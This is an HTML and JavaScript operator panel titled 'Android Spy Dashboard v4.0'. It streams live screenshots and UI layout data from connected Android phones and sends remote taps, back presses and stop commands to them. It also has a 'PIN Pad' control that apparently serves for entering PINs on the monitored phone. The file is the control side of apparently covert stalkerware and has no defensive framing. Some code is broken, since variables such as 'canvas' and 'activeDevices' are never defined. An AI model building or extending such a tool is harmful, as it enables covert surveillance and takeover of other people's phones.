<!DOCTYPE html>
<html>
<head>
    <title>üî• Android Spy Dashboard v4.0</title>
    <script src="/socket.io/socket.io.js"></script>
    <script src="/node_modules/chart.js/dist/chart.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh; overflow: hidden;
        }
        
        .container { display: flex; height: 100vh; }
        
        .sidebar {
            width: 350px; background: rgba(255,255,255,0.95);
            backdrop-filter: blur(20px); padding: 20px; overflow-y: auto;
            box-shadow: 2px 0 20px rgba(0,0,0,0.1);
        }
        
        .main-content { flex: 1; position: relative; overflow: hidden; }
        
        .screen-container {
            position: relative; width: 100%; height: 100%;
            background: #000; display: flex; align-items: center; justify-content: center;
        }
        
        .phone-frame {
            width: 380px; height: 820px; background: #000;
            border: 20px solid #333; border-radius: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            position: relative; overflow: hidden;
        }
        
        #screenCanvas {
            width: 100%; height: 100%; border-radius: 20px;
            cursor: crosshair; background: #111;
        }
        
        /* üî• LAYOUT OVERLAY - PERFECT! */
        .layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 10;
        }
        
        .layout-node {
            position: absolute; border: 2px solid #00ff88; 
            background: rgba(0,255,136,0.1);
            border-radius: 8px; transition: all 0.2s;
        }
        
        .layout-node:hover {
            border-color: #ff4081 !important; background: rgba(255,64,129,0.2) !important;
            box-shadow: 0 0 20px rgba(255,64,129,0.5);
        }
        
        .layout-node.clickable {
            border-color: #ffeb3b !important; background: rgba(255,235,59,0.2) !important;
        }
        
        .node-info {
            position: absolute; background: rgba(0,0,0,0.9);
            color: white; padding: 4px 8px; font-size: 11px;
            border-radius: 4px; white-space: nowrap; max-width: 150px;
            overflow: hidden; text-overflow: ellipsis;
        }
        
        .device-card {
            background: white; border-radius: 16px; padding: 16px; margin-bottom: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1); cursor: pointer;
            transition: all 0.3s; border-left: 4px solid #667eea;
        }
        
        .device-card:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(0,0,0,0.15); }
        .device-card.active { border-left-color: #00ff88; background: rgba(0,255,136,0.1); }
        
        .device-title { font-size: 16px; font-weight: 600; color: #333; margin-bottom: 4px; }
        .device-info { font-size: 12px; color: #666; margin-bottom: 8px; }
        .status { font-size: 11px; padding: 4px 8px; border-radius: 12px; }
        .status.active { background: #d4edda; color: #155724; }
        
        .control-panel {
            background: rgba(255,255,255,0.9); border-radius: 16px;
            padding: 16px; margin-top: 20px; backdrop-filter: blur(10px);
        }
        
        .btn { 
            width: 100%; padding: 12px; border: none; border-radius: 8px;
            font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 8px;
            transition: all 0.2s;
        }
        
        .btn-primary { background: linear-gradient(45deg, #667eea, #764ba2); color: white; }
        .btn-primary:hover { transform: scale(1.02); }
        .btn-danger { background: #ff4757; color: white; }
        
        .stats { 
            display: grid; grid-template-columns: 1fr 1fr; gap: 12px; 
            margin: 20px 0; font-size: 12px;
        }
        
        .stat-item { 
            background: rgba(102,126,234,0.1); padding: 8px 12px;
            border-radius: 8px; text-align: center;
        }
        
        #fpsChart { height: 100px; margin-top: 10px; }
        
        .loading { text-align: center; color: #666; font-style: italic; }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <h2 style="margin-bottom: 24px; color: #333; text-align: center;">üì± Spy Dashboard v4.0</h2>
            
            <div id="devices-list" class="loading">No devices connected...</div>
            
            <div id="device-stats" class="stats" style="display:none;">
                <div class="stat-item">
                    <div id="fps">0</div>
                    <div>FPS</div>
                </div>
                <div class="stat-item">
                    <div id="nodes">0</div>
                    <div>Layout Nodes</div>
                </div>
            </div>
            
            <div id="control-panel" class="control-panel" style="display:none;">
                <h4>üéÆ Remote Control</h4>
                <button class="btn btn-primary" onclick="performBack()">üîô Back</button>
                <button class="btn btn-primary" onclick="showKeypad()">‚å®Ô∏è PIN Pad</button>
                <button class="btn btn-primary" onclick="toggleLayout()">üëÅÔ∏è Toggle Layout</button>
                <button class="btn btn-danger" onclick="kickDevice()">‚èπÔ∏è Stop Stream</button>
            </div>
            
            <canvas id="fpsChart"></canvas>
        </div>
        
        <div class="main-content">
            <div class="screen-container">
                <div class="phone-frame">
                    <canvas id="screenCanvas"></canvas>
                    <div id="layoutOverlay" class="layout-overlay"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let frameData = {};
        let layoutVisible = true;
        let fpsChart = null;
        let fpsData = [];
        
        // üî• PERFECT LAYOUT RENDERING
        function renderLayout() {
            const overlay = document.getElementById('layoutOverlay');
            overlay.innerHTML = '';
            
            if (!layoutVisible || !frameData.layout) return;
            
            const canvasRect = document.getElementById('screenCanvas').getBoundingClientRect();
            const scaleX = canvasRect.width / frameData.width;
            const scaleY = canvasRect.height / frameData.height;
            
            frameData.layout.forEach((node, index) => {
                try {
                    const bounds = node.bounds;
                    const x = bounds.left * scaleX;
                    const y = bounds.top * scaleY;
                    const w = (bounds.right - bounds.left) * scaleX;
                    const h = (bounds.bottom - bounds.top) * scaleY;
                    
                    // Node container
                    const nodeEl = document.createElement('div');
                    nodeEl.className = `layout-node ${node.clickable ? 'clickable' : ''}`;
                    nodeEl.style.left = x + 'px';
                    nodeEl.style.top = y + 'px';
                    nodeEl.style.width = w + 'px';
                    nodeEl.style.height = h + 'px';
                    
                    // Click handler
                    nodeEl.onclick = (e) => {
                        e.stopPropagation();
                        performTap(bounds.centerX, bounds.centerY);
                    };
                    
                    // Node info
                    const info = document.createElement('div');
                    info.className = 'node-info';
                    info.innerHTML = `
                        <strong>${node.text?.substring(0,20) || 'No text'}</strong><br>
                        ${node.className?.split('.').pop() || 'Unknown'}
                    `;
                    info.style.left = (x + 4) + 'px';
                    info.style.top = (y + 4) + 'px';
                    
                    overlay.appendChild(nodeEl);
                    overlay.appendChild(info);
                } catch(e) {
                    console.log('Layout render error:', e);
                }
            });
            
            document.getElementById('nodes').textContent = frameData.layout?.length || 0;
        }
        
        function renderFrame() {
            const canvas = document.getElementById('screenCanvas');
            const ctx = canvas.getContext('2d');
            
            // Resize canvas
            canvas.width = frameData.width || 1080;
            canvas.height = frameData.height || 1920;
            canvas.style.width = '100%';
            canvas.style.height = '100%';
            
            if (frameData.imageData) {
                const img = new Image();
                img.onload = () => {
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    renderLayout(); // üî• LAYOUT OVERLAY
                };
                img.src = 'data:image/jpeg;base64,' + frameData.imageData;
            }
        }
        
        // Mouse controls
        canvas.addEventListener('click', (e) => {
            if (!currentDevice || !frameData.width) return;
            
            const rect = canvas.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * frameData.width;
            const y = ((e.clientY - rect.top) / rect.height) * frameData.height;
            
            performTap(x, y);
        });
        
        let lastFrameTime = 0;
        socket.on('screen-frame', (data) => {
            if (data.deviceId === currentDevice?.id) {
                frameData = data.frameData;
                renderFrame();
                
                // FPS calculation
                const now = Date.now();
                fpsData.push(1000 / (now - lastFrameTime));
                if (fpsData.length > 30) fpsData.shift();
                document.getElementById('fps').textContent = Math.round(fpsData.reduce((a,b)=>a+b,0)/fpsData.length);
                lastFrameTime = now;
            }
        });
        
        socket.on('devices-updated', (deviceList) => {
            updateDeviceList(deviceList);
        });
        
        function updateDeviceList(devices) {
            const container = document.getElementById('devices-list');
            if (devices.length === 0) {
                container.innerHTML = '<div class="loading">No devices connected...</div>';
                document.getElementById('device-stats').style.display = 'none';
                document.getElementById('control-panel').style.display = 'none';
                return;
            }
            
            container.innerHTML = devices.map(device => `
                <div class="device-card ${currentDevice?.id === device.id ? 'active' : ''}" 
                     onclick="selectDevice('${device.id}')">
                    <div class="device-title">${device.brand} ${device.model}</div>
                    <div class="device-info">${device.screenWidth}x${device.screenHeight}</div>
                    <div class="status active">üü¢ LIVE</div>
                </div>
            `).join('');
            
            document.getElementById('device-stats').style.display = 'grid';
            document.getElementById('control-panel').style.display = 'block';
        }
        
        function selectDevice(deviceId) {
            currentDevice = activeDevices.find(d => d.id === deviceId);
            document.querySelectorAll('.device-card').forEach(el => el.classList.remove('active'));
            event.target.closest('.device-card').classList.add('active');
            console.log('üì± Selected:', deviceId);
        }
        
        // üî• CONTROL FUNCTIONS
        function performTap(x, y) {
            if (!currentDevice) return;
            socket.emit('send-control', {
                deviceId: currentDevice.id,
                action: 'tap',
                x: x,
                y: y
            });
        }
        
        function performBack() {
            if (!currentDevice) return;
            socket.emit('send-control', {
                deviceId: currentDevice.id,
                action: 'back'
            });
        }
        
        function showKeypad() {
            alert('üî¢ PIN Pad - Click green boxes for numbers!');
        }
        
        function toggleLayout() {
            layoutVisible = !layoutVisible;
            document.getElementById('layoutOverlay').style.display = layoutVisible ? 'block' : 'none';
        }
        
        function kickDevice() {
            if (!currentDevice) return;
            socket.emit('send-control', {
                deviceId: currentDevice.id,
                action: 'stop'
            });
        }
    </script>
</body>
</html>
